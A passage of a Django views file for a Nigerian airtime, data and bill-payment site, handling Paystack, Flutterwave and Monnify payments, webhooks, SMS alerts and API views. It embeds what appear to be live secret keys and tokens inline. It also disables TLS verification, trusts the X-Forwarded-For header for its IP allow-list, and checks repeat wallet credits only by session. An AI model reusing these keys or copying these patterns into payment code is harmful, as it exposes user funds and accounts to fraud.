        ms = object.price
        check = mb.withdraw(mb.id, float(ms))
        if check == False:
            form._errors[forms.forms. NON_FIELD_ERRORS] = ErrorList(
                [u' insufficientr balance, Current Balance #{}'.format(object.user.Account_Balance)])
            return self.form_invalid(form)
        messages.success(
            self.request, 'Your order has been sent you receive download link on email you provided')

        def sendmessage(sender, message, to, route):
            payload = {
                'sender': sender,
                'to': to,
                'message': message,
                'type': '0',
                'routing': route,
                'token': 'cYTj0CCFuGM4PSrvABkoANCBNlNF2SoipZFSNlz5hmKnejg6fubGLFu7Ph2URDj22dWGYjlRqDILQz7kHxARBlAwdC4CpTKHGC5D',
                'schedule': '',
            }

            baseurl = f'https://sms.hollatags.com/api/send/?user={config.hollatag_username}&pass={config.hollatag_password}&to={to}&from={sender}&msg={urllib.parse.quote(message)}'
            response = requests.get(baseurl, verify=False)

        sendmessage('Msorg', "{0} order {1} email address {2}".format(
            object.user.username, object.book_name, object.email), f"{config.sms_notification_number}", "02")

        form.save()

        return super(BookDetail, self).form_valid(form)


def ravepaymentdone(request):

    ref = request.GET.get('txref')
    user = request.user.username

    headers = {
        'Content-Type': 'application/json', 'User-Agent': 'Custom', 
    }

    data = {"txref": ref, "SECKEY": "FLWSECK-fd7f78dd615d0d7b2f87447f60979fba-X"}
    data = json.dumps(data)
    response = requests.post(
        'https://api.ravepay.com/flwv3-pug/getpaidx/api/v2/verify', headers=headers, data=data)

    data = json.loads(response.text)
    context = {'data': response.text}
    if data['data']['status'] == 'successful':

        if data['data']['chargecode'] == '00' or data['data']['chargecode'] == '0':
            amt = float(data['data']['amount'])
            payamount = amt / 100
            amt = (payamount * 0.02)
            paynow = round(payamount - amt)
            mb = CustomUser.objects.get(pk=request.user.pk)
            context = {'data': data}

            mb = CustomUser.objects.get(pk=request.user.pk)
            if not "reference" in request.session:
                mb.deposit(mb.id, paynow,False ,"Flutterwave Funding")
                notify.send(
                    mb, recipient=mb, verb='Flutterwave Payment successful you account has been credited with sum of #{}'.format(paynow))

                paymentgateway.objects.create(
                    user=request.user, reference=ref, amount=paynow, Status="successful")
                request.session["reference"] = ref
            else:
                refere = request.session["reference"]
                if ref == refere:
                    pass
                else:
                    mb.deposit(mb.id, paynow,False ,"Paystack Funding")
                    notify.send(
                        mb, recipient=mb, verb='Paystack Payment successful you account has been credited with sum of #{}'.format(paynow))

                    paymentgateway.objects.create(
                        user=request.user, reference=ref, amount=paynow, Status="successful")
                    request.session["reference"] = ref

    else:
        messages.error(request, 'Our payment gateway return Payment tansaction failed status {}'.format(
            data["data"]["status"]))

    return render(request, 'ravepaymentdone.html', context)


def paymentrave(request):
    if request.method == 'POST':
        form = paymentraveform(request.POST)
        if form.is_valid():
            amount = form.cleaned_data['amount']
            username = request.user.username
            email = request.user.email
            phone = request.user.Phone
            amount = ((amount * 100) + (0.02 * amount * 100))

            headers = {
                'Authorization': f'Bearer {config.Paystack_secret_key}',
                'Content-Type': 'application/json', 'User-Agent': 'Custom', 
            }

            ab = {"amount": amount, "email": email}
            data = json.dumps(ab)
            response = requests.post(
                'https://api.paystack.co/transaction/initialize', headers=headers, data=data)
            #print(response.text)
            loaddata = json.loads(response.text)
            amt = loaddata["data"]["authorization_url"]

            #print(username, email, phone)

            return HttpResponseRedirect(amt)

    else:
        form = paymentraveform()

    return render(request, 'payonline.html', {'form': form})


@require_POST
@csrf_exempt
# @require_http_methods(["GET", "POST"])
def payonlinedone(request):
    a = f'{config.Paystack_secret_key}'
    secret = bytes(a, encoding="ascii")
    payload = request.body
    sign = hmac.new(secret, payload, hashlib.sha512).hexdigest()
    code = request.META.get('HTTP_X_PAYSTACK_SIGNATURE')

    bodydata = json.loads(payload)
    ref = bodydata['data']['reference']

    forwarded_for = u'{}'.format(request.META.get('HTTP_X_FORWARDED_FOR'))
    whitelist = ["52.31.139.75", "52.49.173.169", "52.214.14.220"]
    if forwarded_for in whitelist:
        if code == sign:
            url = "https://api.paystack.co/transaction/verify/{}".format(ref)
            response = requests.get(url, headers={
                                    'Authorization': f'Bearer {config.Paystack_secret_key}', "Content-Type": "application/json"})
            ab = json.loads(response.text)

            if (response.status_code == 200 and ab['status'] == True) and (ab["message"] == "Verification successful" and ab["data"]["status"] == "success"):
                user = ab['data']["customer"]['email']
                mb = CustomUser.objects.get(email__iexact=user)
                amount = (ab['data']['amount'])
                paynow = (round(amount/100 - 0.02 * amount/100))

                if not paymentgateway.objects.filter(reference=ref).exists():
                    try:
                        previous_bal = mb.Account_Balance
                        mb.deposit(mb.id, paynow + 1,False ,"Paystack Funding")
                        paymentgateway.objects.create(
                            user=mb, reference=ref, amount=paynow, Status="successful", gateway="paystack")
                        Wallet_summary.objects.create(user=mb, product=" N{} paystack Funding ".format(
                            paynow), amount=paynow, previous_balance=previous_bal, after_balance=(previous_bal + paynow))
                        notify.send(
                            mb, recipient=mb, verb='Paystack Payment successful you account has been credited with sum of #{}'.format(paynow))
                    except:
                        return HttpResponse(status=200)
                else:
                    pass

            else:
                messages.error(
                    request, 'Our payment gateway return Payment tansaction failed status {}'.format(ab["message"]))

    else:
        return HttpResponseForbidden('Permission denied.')
    #print("hello")
    return HttpResponse(status=200)


@csrf_exempt
# @require_http_methods(["GET", "POST"])
def ussdcallback(request):

    #print("ussd callback herer")
    #print(request.body)
    #print("ussd callback herer 2")

    return HttpResponse(status=200)


def create_id():
    num = random.randint(1, 10)
    num_2 = random.randint(1, 10)
    num_3 = random.randint(1, 10)
    return str(num_2)+str(num_3)+str(uuid.uuid4())


def flutterwavepayment(request):
    if request.method == 'POST':
        form = paymentraveform(request.POST)
        if form.is_valid():
            amount = form.cleaned_data['amount']
            username = request.user.username
            email = request.user.email
            phone = request.user.Phone
            amount = (amount) + (0.015 * amount)

            headers = {
                'Content-Type': 'application/json', 'User-Agent': 'Custom', 

            }

            ab = {"txref": create_id(), "PBFPubKey": "FLWPUBK-7e02397bad16e051a49495ef37b4cc23-X", "customer_email": email,
                  "amount": amount, "currency": "NGN", "redirect_url": "https://www.yuniqtelecoms.com/profile/"}
            data = json.dumps(ab)
            #print(data)
            #data = '{"txref":"MC-1520443531487","PBFPubKey":"FLWPUBK-d029dfa2c4130538504aa1fb7e85a7cd-X", "customer_email": "user@example.com", "amount": 1000, "currency": "NGN", "redirect_url": "https://www.dataworld.com/ravepaymentdone"}'

            #response = requests.post('https://api.ravepay.co/flwv3-pug/getpaidx/api/v2/hosted/pay', headers=headers, data=data)

            response = requests.post(
                'https://api.ravepay.co/flwv3-pug/getpaidx/api/v2/hosted/pay', headers=headers, data=data)

            #print(response)

            loaddata = json.loads(response.text)
            amt = loaddata["data"]["link"]

            #print(username, email, phone)

            return HttpResponseRedirect(amt)

    else:
        form = paymentraveform()

    return render(request, 'ravepayment.html', {'form': form})


@require_POST
@csrf_exempt
# @require_http_methods(["GET", "POST"])
def flutterwavepaymentdone(request):
    #print(request.body)
    hash_code = request.META.get('HTTP_VERIF_HASH')
    #print(hash_code)
    #print(type(hash_code))

    if hash_code == 'MSORGHOOT$@#$$#%':
        #print("hurray")
        data = json.loads(request.body)
        #print(data["txRef"])
        #print(data["status"])
        #print(data["amount"])

        data = json.loads(request.body)
        headers = {
            'Content-Type': 'application/json', 'User-Agent': 'Custom', 
        }

        ab = {"txref": data["txRef"],
              "SECKEY": "FLWSECK-ce1767f49ae239374339ff27e0cf2659-X"}
        data = json.dumps(ab)

        response = requests.post(
            'https://api.ravepay.co/flwv3-pug/getpaidx/api/v2/verify', headers=headers, data=data)
        #print(response.text)
        data = json.loads(response.text)

        #print(data["data"]["txref"])
        #print(data["data"]["status"])
        #print(data["data"]["amount"])
        #print(data["data"]["chargecode"])
        #print(data["data"]["chargemessage"])

        if (response.status_code == 200 and data["data"]["chargecode"] == "00" and data["data"]["status"] == "successful"):
            #print("processing")
            ab = json.loads(request.body)
            user = ab["customer"]['email']
            #print(user)
            mb = CustomUser.objects.get(email__iexact=user)
            amount = (data["data"]["amount"])
            paynow = (round(amount - (0.015 * amount)))

            if not paymentgateway.objects.filter(reference=data["data"]["txref"]).exists():
                mb.deposit(mb.id, paynow + 1,False ,"Flutterwave Funding")
                notify.send(
                    mb, recipient=mb, verb='flutterwave Payment successful you account has been credited with sum of #{}'.format(paynow))

                paymentgateway.objects.create(
                    user=mb, reference=data["data"]["txref"], amount=paynow, gateway="Flutterwave", Status="successful")

                #print("done")
            else:
                pass

        else:
            messages.error(
                request, 'Our payment gateway return Payment tansaction failed statuss')

    return HttpResponse(status=200)


# API VIEW START HERE CREATED BY MUSA ABDUL GANIYU


class UserCreate(APIView):
    """
    Creates the user.
    """

    def post(self, request, format='json'):
        serializer = CustomUserSerializer(data=request.data)
        if serializer.is_valid():
            user = serializer.save()
            if user:
                token = Token.objects.create(user=user)
                json = serializer.data
                json['token'] = token.key
                
                try:
        
        
                        current_site = get_current_site(self.request)
                        mail_subject = 'Activate your yuniqtelecoms account.'
                        message =  {
                            'user': user,
                            'domain': current_site.domain,
                            'uid':urlsafe_base64_encode(force_bytes(user.pk)),
                            'token':account_activation_token.make_token(user),
                        }
                        message = get_template('acc_active_email.html').render(message)
                        to_email = user.email
                        email = EmailMessage(mail_subject, message, to=[to_email] )
                        email.content_subtype = "html"
                        email.send()
        
        
        
                except:
                    pass
                
                
                return Response(json, status=200)

        return Response(serializer.errors, status=400)


# API VIEW START HERE CREATED BY MUSA ABDUL GANIYU


class FacebookLogin(SocialLoginView):
    adapter_class = FacebookOAuth2Adapter


class ApiDoc(TemplateView):
    template_name = 'swagger-ui.html'

    def get_context_data(self, **kwargs):
        context = super(ApiDoc, self).get_context_data(**kwargs)
        context['plans'] = Plan.objects.all()
        context['network'] = Network.objects.all()
        context['cableplans'] = CablePlan.objects.all()
        context['cable'] = Cable.objects.all()
        context['disco'] = Disco_provider_name.objects.all()

        if Token.objects.filter(user=self.request.user).exists():
            context['token'] = Token.objects.get(user=self.request.user)
        else:
            Token.objects.create(user=self.request.user)
            context['token'] = Token.objects.get(user=self.request.user)

        return context


###API ####


class PasswordChangeAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def post(self, request, format=None):
        try:
            serializer = PasswordChangeSerializer(data=request.data)
            if serializer.is_valid():
                if not request.user.check_password(serializer.data.get('old_password')):
                    return Response({'old_password': 'Wrong old password entered.'}, status=400)

                elif str(serializer.data.get('new_password1')) != str(serializer.data.get('new_password2')):
                    return Response({'new_password2': 'new Passwords are not match'}, status=400)

                elif len(serializer.data.get('new_password1')) < 8:
                    return Response({'new_password1': 'new password too short, minimum of 8 character.'}, status=400)

                # set_password also hashes the password that the user will get
                request.user.set_password(serializer.data.get('new_password1'))
                request.user.save()

            return Response({'status': 'New password has been saved.'}, status=200)

            # return Response(serializer.errors,status=400)

        except CustomUser.DoesNotExist:
            return Response(status=500)


class VerificationEmailAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        #try:
        
        user = request.user
        current_site = get_current_site(self.request)
        mail_subject = 'Activate your yuniqtelecoms account.'
        message =  {
            'user': user,
            'domain': current_site.domain,
            'uid':urlsafe_base64_encode(force_bytes(user.pk)),
            'token':account_activation_token.make_token(user),
        }
        message = get_template('acc_active_email.html').render(message)
        to_email = user.email
        email = EmailMessage(mail_subject, message, to=[to_email] )
        email.content_subtype = "html"
        email.send()
        return Response(status=200)

        # except :
        #     return Response(status=500)


class CustomUserCreate(APIView):

    def post(self, request, format='json'):
        serializer = CustomUserSerializer(data=request.data)
        if serializer.is_valid():
            user = serializer.save()
            if user:
                token = Token.objects.create(user=user)
                json = serializer.data
                json['token'] = token.key
                
                try:
                        current_site = get_current_site(self.request)
                        mail_subject = 'Activate your yuniqtelecoms account.'
                        message =  {
                            'user': user,
                            'domain': current_site.domain,
                            'uid':urlsafe_base64_encode(force_bytes(user.pk)),
                            'token':account_activation_token.make_token(user),
                        }
                        message = get_template('acc_active_email.html').render(message)
                        to_email = user.email
                        email = EmailMessage(mail_subject, message, to=[to_email] )
                        email.content_subtype = "html"
                        email.send()
                except:
                    pass
        
        
        
                return Response(json, status=201)

        return Response(serializer.errors, status=400)


class Api_History(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None, **kwargs):
        data = Data.objects.filter(
            user=request.user).order_by('-create_date')[:10]
        data_serializer = DataSerializer(data, many=True)
        airtimetopup = AirtimeTopup.objects.filter(
            user=request.user).order_by('-create_date')[:10]
        airtimetopup_serializer = AirtimeTopupSerializer(
            airtimetopup, many=True)
        payment = paymentgateway.objects.filter(
            user=request.user).order_by('-created_on')[:10]
        payment_serializer = paymentgatewaySerializer(payment, many=True)
        cablesub = Cablesub.objects.filter(
            user=request.user).order_by('-create_date')[:10]
        cablesub_serializer = CablesubSerializer(cablesub, many=True)

        return Response({
            'data': data_serializer.data,
            'topup': airtimetopup_serializer.data,
            'paymentgateway': payment_serializer.data,
            'cablesub': cablesub_serializer.data,

        })


class UserListView(generics.ListAPIView):
    permission_classes = (IsAdminUser,)
    queryset = CustomUser.objects.all()
    serializer_class = CustomUserSerializer

class UserAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):

        try:

            def create_id():
                num = random.randint(1, 10)
                num_2 = random.randint(1, 10)
                num_3 = random.randint(1, 10)
                return str(num_2)+str(num_3)+str(uuid.uuid4())[:4]

            body = {
                "accountReference": create_id(),
                "accountName": request.user.username,
                "currencyCode": "NGN",
                "contractCode": f"{config.monnify_contract_code}",
                "customerEmail": request.user.email,
                "incomeSplitConfig": [],
                "restrictPaymentSource": False,
                "allowedPaymentSources": {},
                "customerName": request.user.username,
                "getAllAvailableBanks": True,
            }

            if not request.user.accounts:

                data = json.dumps(body)
                ad = requests.post("https://api.monnify.com/api/v1/auth/login", auth=HTTPBasicAuth(f'{config.monnify_API_KEY}', f'{config.monnify_SECRET_KEY}'))
                mydata = json.loads(ad.text)
                headers = {'Content-Type': 'application/json', 'User-Agent': 'Custom', "Authorization": "Bearer {}" .format(mydata['responseBody']["accessToken"])}
                ab = requests.post("https://api.monnify.com/api/v2/bank-transfer/reserved-accounts",headers=headers, data=data)

                mydata = json.loads(ab.text)

                user = request.user
                user.reservedaccountNumber = mydata["responseBody"]["accounts"][0]["accountNumber"]
                user.reservedbankName = mydata["responseBody"]["accounts"][0]["bankName"]
                user.reservedaccountReference = mydata["responseBody"]["accountReference"]
                user.accounts = json.dumps({"accounts":mydata["responseBody"]["accounts"]})
                user.save()

            else:
                pass

        except:
            pass


        try:
                    if request.user.user_type == "Affilliate":
                                mtn = (TopupPercentage.objects.get(network=Network.objects.get(name="MTN")).Affilliate_percent)
                                glo = (TopupPercentage.objects.get(network=Network.objects.get(name="GLO")).Affilliate_percent)
                                airtel = (TopupPercentage.objects.get(network=Network.objects.get(name="AIRTEL")).Affilliate_percent)
                                mobile = (TopupPercentage.objects.get(network=Network.objects.get(name="9MOBILE")).Affilliate_percent)

                                mtn_s = (TopupPercentage.objects.get(network=Network.objects.get(name="MTN")).share_n_sell_affilliate_percent)
                                glo_s = (TopupPercentage.objects.get( network=Network.objects.get(name="GLO")).share_n_sell_affilliate_percent)
                                airtel_s = (TopupPercentage.objects.get(network=Network.objects.get(name="AIRTEL")).share_n_sell_affilliate_percent)
                                mobile_s = (TopupPercentage.objects.get(network=Network.objects.get(name="9MOBILE")).share_n_sell_affilliate_percent)



                    elif request.user.user_type == "TopUser":
                                mtn = (TopupPercentage.objects.get(network=Network.objects.get(name="MTN")).topuser_percent)
                                glo = (TopupPercentage.objects.get(network=Network.objects.get(name="GLO")).topuser_percent)
                                airtel = (TopupPercentage.objects.get(network=Network.objects.get(name="AIRTEL")).topuser_percent)
                                mobile = (TopupPercentage.objects.get(network=Network.objects.get(name="9MOBILE")).topuser_percent)

                                mtn_s = (TopupPercentage.objects.get(network=Network.objects.get(name="MTN")).share_n_sell_topuser_percent)
                                glo_s = (TopupPercentage.objects.get( network=Network.objects.get(name="GLO")).share_n_sell_topuser_percent)
                                airtel_s = (TopupPercentage.objects.get(network=Network.objects.get(name="AIRTEL")).share_n_sell_topuser_percent)
                                mobile_s = (TopupPercentage.objects.get(network=Network.objects.get(name="9MOBILE")).share_n_sell_topuser_percent)

                    else:
                                mtn = (TopupPercentage.objects.get(network=Network.objects.get(name="MTN")).percent)
                                glo = (TopupPercentage.objects.get(network=Network.objects.get(name="GLO")).percent)
                                airtel = (TopupPercentage.objects.get(network=Network.objects.get(name="AIRTEL")).percent)
                                mobile = (TopupPercentage.objects.get(network=Network.objects.get(name="9MOBILE")).percent)

                                mtn_s = (TopupPercentage.objects.get(network=Network.objects.get(name="MTN")).share_n_sell_percent)
                                glo_s = (TopupPercentage.objects.get( network=Network.objects.get(name="GLO")).share_n_sell_percent)
                                airtel_s = (TopupPercentage.objects.get(network=Network.objects.get(name="AIRTEL")).share_n_sell_percent)
                                mobile_s = (TopupPercentage.objects.get(network=Network.objects.get(name="9MOBILE")).share_n_sell_percent)

        except:
            pass



        try:

                    plan_item = Plan.objects.filter(network=Network.objects.get(name="MTN")).order_by('plan_amount')
                    plan_item_2 = Plan.objects.filter(
                        network=Network.objects.get(name="GLO")).order_by('plan_amount')
                    plan_item_3 = Plan.objects.filter(
                        network=Network.objects.get(name="AIRTEL")).order_by('plan_amount')
                    plan_item_4 = Plan.objects.filter(
                        network=Network.objects.get(name="9MOBILE")).order_by('plan_amount')

                    user = request.user
                    if user.user_type == "Affilliate":
                            plan_serializer = PlanSerializer2(plan_item,many=True)
                            plan_serializerG = PlanSerializer2(Plan.objects.filter(network=Network.objects.get(name="MTN")).order_by('plan_amount').filter(plan_type="GIFTING"),many=True)
                            plan_serializerSME = PlanSerializer2(Plan.objects.filter(network=Network.objects.get(name="MTN")).order_by('plan_amount').filter(plan_type="SME"),many=True)
                            plan_serializerCG = PlanSerializer2(Plan.objects.filter(network=Network.objects.get(name="MTN")).order_by('plan_amount').filter(plan_type="CORPORATE GIFTING"),many=True)


                            plan_serializer_2 = PlanSerializer2(plan_item_2,many=True)
                            plan_serializer_3 = PlanSerializer2(plan_item_3,many=True)
                            plan_serializer_4 = PlanSerializer2(plan_item_4,many=True)




                    elif user.user_type == "TopUser":

                            plan_serializer = PlanSerializer3(plan_item,many=True)
                            plan_serializerG = PlanSerializer3(Plan.objects.filter(network=Network.objects.get(name="MTN")).order_by('plan_amount').filter(plan_type="GIFTING"),many=True)
                            plan_serializerSME = PlanSerializer3(Plan.objects.filter(network=Network.objects.get(name="MTN")).order_by('plan_amount').filter(plan_type="SME"),many=True)
                            plan_serializerCG = PlanSerializer3(Plan.objects.filter(network=Network.objects.get(name="MTN")).order_by('plan_amount').filter(plan_type="CORPORATE GIFTING"),many=True)


                            plan_serializer_2 = PlanSerializer3(plan_item_2,many=True)
                            plan_serializer_3 = PlanSerializer3(plan_item_3,many=True)
                            plan_serializer_4 = PlanSerializer3(plan_item_4,many=True)


                    else:
                            plan_serializer = PlanSerializer(plan_item,many=True)
                            plan_serializerG = PlanSerializer(Plan.objects.filter(network=Network.objects.get(name="MTN")).order_by('plan_amount').filter(plan_type="GIFTING"),many=True)
                            plan_serializerSME = PlanSerializer(Plan.objects.filter(network=Network.objects.get(name="MTN")).order_by('plan_amount').filter(plan_type="SME"),many=True)
                            plan_serializerCG = PlanSerializer(Plan.objects.filter(network=Network.objects.get(name="MTN")).order_by('plan_amount').filter(plan_type="CORPORATE GIFTING"),many=True)
                            plan_serializer_2 = PlanSerializer(plan_item_2,many=True)
                            plan_serializer_3 = PlanSerializer(plan_item_3,many=True)
                            plan_serializer_4 = PlanSerializer(plan_item_4,many=True)

        except:
            pass


        try:
            item = request.user
            cplan_item = CablePlan.objects.filter(
                cablename=Cable.objects.get(name="GOTV")).order_by('plan_amount')
            cplan_item_2 = CablePlan.objects.filter(
                cablename=Cable.objects.get(name="DSTV")).order_by('plan_amount')
            cplan_item_3 = CablePlan.objects.filter(
                cablename=Cable.objects.get(name="STARTIME")).order_by('plan_amount')
            cable_item = CablenameSerializer(Cable.objects.all(), many=True)



        except:
            pass


        try:
                if request.user.user_type == "Affilliate":
                    amt1 = Result_Checker_Pin.objects.get(
                        exam_name="WAEC").Affilliate_price
                    amt2 = Result_Checker_Pin.objects.get(
                        exam_name="NECO").Affilliate_price
                elif request.user.user_type == "TopUser":
                    amt1 = Result_Checker_Pin.objects.get(
                        exam_name="WAEC").TopUser_price
                    amt2 = Result_Checker_Pin.objects.get(
                        exam_name="NECO").TopUser_price


                else:
                    amt1 = Result_Checker_Pin.objects.get(
                        exam_name="WAEC").amount
                    amt2  = Result_Checker_Pin.objects.get(
                        exam_name="NECO").amount

        except:
            pass


        try:
            item = request.user
            user_serializer = CustomUserSerializer(item)
            if request.user.notifications.all():
                x = [x.verb for x in request.user.notifications.all()[:1]][0]
            else:
                x = ""





            return Response({
                'user': user_serializer.data,
                "notification": {"message": x},

                "percentage":   {
                                "MTN" : {

                                    "percent": 0 if not Percentage.objects.filter(network__name = "MTN") else Percentage.objects.get(network__name = "MTN").percent,
                                    "phone":Admin_number.objects.filter(network = "MTN").first().phone_number
                                },
                                "GLO":{

                                   "percent": 0 if not Percentage.objects.filter(network__name = "GLO") else Percentage.objects.get(network__name = "GLO").percent,
                                    "phone":Admin_number.objects.filter(network = "GLO").first().phone_number
                                },
                                "9MOBILE":{

                                    "percent": 0 if not Percentage.objects.filter(network__name = "9MOBILE") else Percentage.objects.get(network__name = "9MOBILE").percent,
                                     "phone":Admin_number.objects.filter(network = "9MOBILE").first().phone_number
                                },
                                "AIRTEL":{

                                   "percent": 0 if not Percentage.objects.filter(network__name = "AIRTEL") else Percentage.objects.get(network__name = "AIRTEL").percent,
                                    "phone":Admin_number.objects.filter(network= "AIRTEL").first().phone_number
                                }},

                "topuppercentage":  {
                                "MTN" : {

                                    "VTU": mtn,
                                    'Share and Sell': mtn_s
                                },
                                "GLO":{

                                    "VTU": glo,
                                    'Share and Sell': glo_s
                                },
                                "9MOBILE":{

                                    "VTU": mobile,
                                    'Share and Sell': mobile_s
                                },
                                "AIRTEL":{

                                    "VTU": airtel,
                                    'Share and Sell': airtel_s
                                }},

                "Admin_number": Admin_numberSerializer(Admin_number.objects.all(), many=True).data,
                #  "Exam":Result_Checker_PinSerializer(Result_Checker_Pin.objects.all(),many=True).data,
                 "Exam": {
                        "WAEC":{

                            "amount": amt1
                        },
                        "NECO":{

                            "amount": amt2
                        }
                    },
                 "banks":BankAccount_PinSerializer(BankAccount.objects.all(),many=True).data,
                 "banners":AppAdsImageSerializer(AppAdsImage.objects.all(),many=True).data,
                 "Dataplans":{ 'MTN_PLAN': {"CORPORATE":plan_serializerCG.data ,"SME": plan_serializerSME.data,"GIFTING": plan_serializerG.data,"ALL":  plan_serializer.data},
                               'GLO_PLAN': {"ALL":  plan_serializer_2.data},
                               'AIRTEL_PLAN': { "ALL":  plan_serializer_3.data},
                               '9MOBILE_PLAN': { "ALL":  plan_serializer_4.data},},
                 "Cableplan":{'GOTVPLAN': CablePlanSerializer(cplan_item, many=True).data,
                                'DSTVPLAN': CablePlanSerializer(cplan_item_2, many=True).data,
                                'STARTIMEPLAN': CablePlanSerializer(cplan_item_3, many=True).data,
                                'cablename':  cable_item.data,},
                "support_phone_number":config.support_phone_number,
                 "recharge": {
                    "mtn": Recharge_pin.objects.filter(network=Network.objects.get(name="MTN")).filter(available=True).count(),
                    "glo": Recharge_pin.objects.filter(network=Network.objects.get(name="GLO")).filter(available=True).count(),
                    "airtel": Recharge_pin.objects.filter(network=Network.objects.get(name="AIRTEL")).filter(available=True).count(),
                    "9mobile": Recharge_pin.objects.filter(network=Network.objects.get(name="9MOBILE")).filter(available=True).count(),
                     "mtn_pin":RechargeSerializer(Recharge.objects.filter(network=Network.objects.get(name="MTN")), many=True).data,
                     "glo_pin":RechargeSerializer(Recharge.objects.filter(network=Network.objects.get(name="GLO")), many=True).data,
                     "airtel_pin":RechargeSerializer(Recharge.objects.filter(network=Network.objects.get(name="AIRTEL")), many=True).data,
                     "9mobile_pin":RechargeSerializer(Recharge.objects.filter(network=Network.objects.get(name="9MOBILE")), many=True).data

                } })

        except CustomUser.DoesNotExist:
            return Response(status=404)


class AlertAPIView(APIView):

    def get(self, request, format=None):

        if Info_Alert.objects.all():
            y = [x.message for x in Info_Alert.objects.all()[:1]][0]

        else:
            y = ""

        return Response({

            "alert": y


        })


class CablenameAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        try:
            item = request.user
            cplan_item = CablePlan.objects.filter(
                cablename=Cable.objects.get(name="GOTV")).order_by('plan_amount')
            cplan_item_2 = CablePlan.objects.filter(
                cablename=Cable.objects.get(name="DSTV")).order_by('plan_amount')
            cplan_item_3 = CablePlan.objects.filter(
                cablename=Cable.objects.get(name="STARTIME")).order_by('plan_amount')
            cable_item = CablenameSerializer(Cable.objects.all(), many=True)

            return Response({

                'GOTVPLAN': CablePlanSerializer(cplan_item, many=True).data,
                'DSTVPLAN': CablePlanSerializer(cplan_item_2, many=True).data,
                'STARTIME': CablePlanSerializer(cplan_item_3, many=True).data,
                'cablename':  cable_item.data,



            })

        except:
            return Response(status=404)


class DiscoAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        try:

            disko_item = DiscoSerializer(
                Disco_provider_name.objects.all(), many=True)

            return Response({


                'disko':  disko_item.data,


            })

        except:
            return Response(status=404)


class NetworkAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        try:

            plan_item = Plan.objects.filter(
                network=Network.objects.get(name="MTN")).order_by('plan_amount')
            plan_item_2 = Plan.objects.filter(
                network=Network.objects.get(name="GLO")).order_by('plan_amount')
            plan_item_3 = Plan.objects.filter(
                network=Network.objects.get(name="AIRTEL")).order_by('plan_amount')
            plan_item_4 = Plan.objects.filter(
                network=Network.objects.get(name="9MOBILE")).order_by('plan_amount')

            plan_serializer = PlanSerializer(plan_item, many=True)
            plan_serializer_2 = PlanSerializer(plan_item_2, many=True)
            plan_serializer_3 = PlanSerializer(plan_item_3, many=True)
            plan_serializer_4 = PlanSerializer(plan_item_4, many=True)

            return Response({
                'MTN_PLAN': plan_serializer.data,
                'GLO_PLAN': plan_serializer_2.data,
                'AIRTEL_PLAN': plan_serializer_3.data,
                '9MOBILE_PLAN': plan_serializer_4.data,
            })

        except:
            return Response(status=404)



class DataAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, id, format=None):
        try:
            item = Data.objects.filter(user=request.user).get(pk=id)
            serializer = DataSerializer(item)
            return Response(serializer.data)
        except Data.DoesNotExist:
            return Response(status=404)



class DataAPIListView(APIView):
    permission_classes = (IsAuthenticated,) 

    def get(self, request, format=None):
        search = request.GET.get("search",None)
        if search:
            items =  Data.objects.filter(user=request.user).filter(Q(id__icontains=search) | Q(ident__icontains=search) | Q(mobile_number__icontains=search)).order_by('-create_date')
            serializer = DataSerializer(items, many=True)
            return Response(serializer.data)

        
        else:
                    
            items = Data.objects.filter(user=request.user).order_by('-create_date')
            paginator = PageNumberPagination()
            result_page = paginator.paginate_queryset(items, request)
            serializer = DataSerializer(result_page, many=True)
            return paginator.get_paginated_response(serializer.data)

    def post(self, request, format=None):
        status = "processing"

        serializer = DataSerializer(
            data=request.data, context={'request': request})

        if serializer.is_valid():
            order_username = (serializer.validated_data["user"]).username
            num = serializer.validated_data["mobile_number"]
            plan = serializer.validated_data["plan"]
            try:
                customer_ref = serializer.validated_data["customer_ref"] 
            except:
                customer_ref = ""

            def create_id():
                    num = random.randint(1,10)
                    num_2 = random.randint(1,10)
                    num_3 = random.randint(1,10)
                    # return str(num_2)+str(num_3)+str(uuid.uuid4())
                    return "DATA"+str(num_3)+str(uuid.uuid4())


            ident = create_id()

            net = str(serializer.validated_data["network"])
            user = (serializer.validated_data["user"])
            errors = {}

            previous_bal = user.Account_Balance
            provider_source = ""

            if user.user_type == "Affilliate":
                amount = float(plan.Affilliate_price)

            elif user.user_type == "API":
                amount = float(plan.api_price)

            elif user.user_type == "TopUser":

                amount = float(plan.TopUser_price)
            else:
                amount = float(plan.plan_amount)


            with transaction.atomic():
                check = user.withdraw(user.id, amount)
                if check == False:
                    errors['error'] = u'Y insufficient balance '
                    raise serializers.ValidationError(errors)
                Wallet_summary.objects.create(user=user, product="{} {}{}   N{}  DATA topup  with {} ".format(
                    net, plan.plan_size, plan.plan_Volume, amount, num), amount=amount, previous_balance=previous_bal, after_balance=(previous_bal - amount))
           
            try:
               if plan.commission > 0:
                   if user.referer_username:
                       if CustomUser.objects.filter(username__iexact = user.referer_username).exists():
                           referer  = CustomUser.objects.get(username__iexact = user.referer_username)

                           # if  referer.user_type == "TopUser" or referer.user_type == "Affilliate":
                           if  user.user_type == "Smart Earner":
                               com =  referer.Referer_Bonus
                               referer.ref_deposit(plan.commission)

                               Wallet_summary.objects.create(user= referer, product="[Referal bonus ] you received  N{} commission  from your referal {} Data Transaction".format(plan.commission,user.username), amount = plan.commission, previous_balance = com, after_balance= (com + plan.commission))

                               notify.send(referer, recipient=referer, verb=" [Referal bonus ] you received   N{}commission  from your referal {} Data Transaction".format(plan.commission,user.username))

            except:
               pass

            def sendmessage(sender, message, to, route):
                payload = {
                    'sender': sender,
                    'to': to,
                    'message': message,
                    'type': '0',
                    'routing': route,
                    'token': 'cYTj0CCFuGM4PSrvABkoANCBNlNF2SoipZFSNlz5hmKnejg6fubGLFu7Ph2URDj22dWGYjlRqDILQz7kHxARBlAwdC4CpTKHGC5D',
                    'schedule': '', }
                baseurl = f'https://sms.hollatags.com/api/send/?user={config.hollatag_username}&pass={config.hollatag_password}&to={to}&from={sender}&msg={urllib.parse.quote(message)}'
                response = requests.get(baseurl, verify=False)

            def senddatasmeplug(net,plan_id,num):
